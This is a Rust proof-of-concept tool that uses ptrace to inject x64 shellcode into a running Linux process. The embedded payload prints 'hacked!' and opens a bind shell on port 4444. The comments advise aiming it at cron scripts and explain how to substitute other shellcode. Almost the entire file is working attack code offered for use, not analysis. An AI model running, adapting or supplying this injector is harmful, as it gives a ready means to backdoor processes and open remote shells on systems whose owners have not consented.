/* this program injects a x64 backdoor (bind shell port 4444) into a running process
	usage: ./process-inject <target_pid>
		written: @skript0r

Dependencies **at the time of this writing** (add these to your Cargo.toml before compiling)
	nix  = "0.14.1"
	libc = "0.2"

Disclaimer: This POC does not perform seamless injection, it makes no attempt to restore normal execution flow to the target program.
	    The target process will exit gracefully once the payload has been executed.
	    For the reason above, this is recommended for use against cron scripts as opposed to daemons
	    (unless you just re-execve() the target daemon at the end of your payload)
*/

use std::{
	env::args,
	process::exit,
	ffi::c_void,
};
use nix::{
	unistd::Pid,
	sys::ptrace::{attach, detach, AddressType, getregs, setregs, read, write},
	sys::wait::*,
};
use libc::user_regs_struct;

fn main() {
	let script_args: Vec<String> = args().collect();
	let target = verify(script_args);
	if target != 1 {
		let pid: nix::unistd::Pid = Pid::from_raw(target);
		inject(pid);
	} else {
		show_usage()
	}
	exit(0);
}

fn verify(script_args: Vec<String>) -> i32 {
	if script_args.len() == 2 {
		let target = &script_args[1];
		let pid: i32 = match target.parse() {
			Ok(pid) => { pid },
			Err(_e) => 1,
		};
		return pid
	} else {
		show_usage()
	}
	return 1
}


fn show_usage() {
	println!("Usage: ./process-inject <pid>");
	exit(1)
}

fn inject(pid: nix::unistd::Pid) {
	println!("[+] attaching to {:?}", pid);
	let _attach = match attach(pid) {
		Ok(_s) => _s,
		Err(e) => panic!("{:?}", e)
	};
	let _status = wait_status(pid);
	let regs    = match getregs(pid) {
		Ok(regs) => regs,
		Err(_e)  => panic!("[-] getregs err"),
	};
	// syringe() performs the memory injection
	syringe(pid, regs.rip as u64);

	let _detach = match detach(pid) {
		Ok(_s)  => _s,
		Err(_e) => panic!("[-] detach err"),
	};
	println!("[+] detached from {:?}", pid);
}

fn syringe(pid: nix::unistd::Pid, rip: u64) {
	println!("[+] Attempting to hijack RIP at {:?}", rip as AddressType);
	// custom x64 shellcode to print "hacked!" and then spawn bind shell to port 4444
	// to change this payload, just take the hex opcodes of your program and convert them to their decimal representation
	let payload: Vec<u8> = vec![184, 1, 0, 0, 0, 191, 1, 0, 0, 0, 72, 190, 104, 97,
	                            99, 107, 101, 100, 33, 10, 86, 72, 137, 230, 186, 8,
				    0, 0, 0, 15, 5, 106, 41, 88, 153, 106, 2, 95, 106, 1,
				    94, 15, 5, 72, 151, 82, 199, 4, 36, 2, 0, 17, 92, 72,
				    137, 230, 106, 16, 90, 106, 49, 88, 15, 5, 106, 50, 88,
				    15, 5, 72, 49, 246, 106, 43, 88, 15, 5, 72, 151, 106, 3,
			            94, 72, 255, 206, 106, 33, 88, 15, 5, 117, 246, 106, 59,
				    88, 153, 72, 187, 47, 98, 105, 110, 47, 115, 104, 0, 83,
				    72, 137, 231, 82, 87, 72, 137, 230, 15, 5];
	let mut addr = rip.clone();
	for byte in payload.iter() {
		let data = *byte as *mut c_void;
		let _memwrite = match write(pid, addr as AddressType, data) {
			Ok(_s) => (),
			Err(e) => panic!("{:?}",e)
		};
		addr += 1;
	}
	let regz = match getregs(pid) {
		Ok(regs) => regs,
		Err(e)  => panic!("{:?}", e)
	};
	let new_rip  = regz.rip as AddressType;
	let new_data = match read(pid, new_rip) {
		Ok(data) => data as AddressType,
		Err(e)  => panic!("{:?}", e)
	};
	println!("[+] Code injected! Current value inside RIP: {:?}", new_data);
}

fn wait_status(pid: nix::unistd::Pid) -> String {
	let status = match waitpid(pid, Some(<WaitPidFlag>::WSTOPPED)) {
		Ok(WaitStatus::Stopped(_, _sig))	=> "ok",
		Ok(WaitStatus::PtraceEvent(_, _sig, _))	=> "ok",
		Ok(WaitStatus::PtraceSyscall(_process)) => "ok",
		Ok(WaitStatus::Signaled(_, _sig, _)) 	=> "ok",
		Ok(WaitStatus::Exited(_process, _))	=> "exited",
		Ok(WaitStatus::Continued(_process))	=> "ok",
		Ok(WaitStatus::StillAlive)		=> "ok",
		Err(_e)				=> panic!("waitpid err")
	};
	return String::from(status)
}
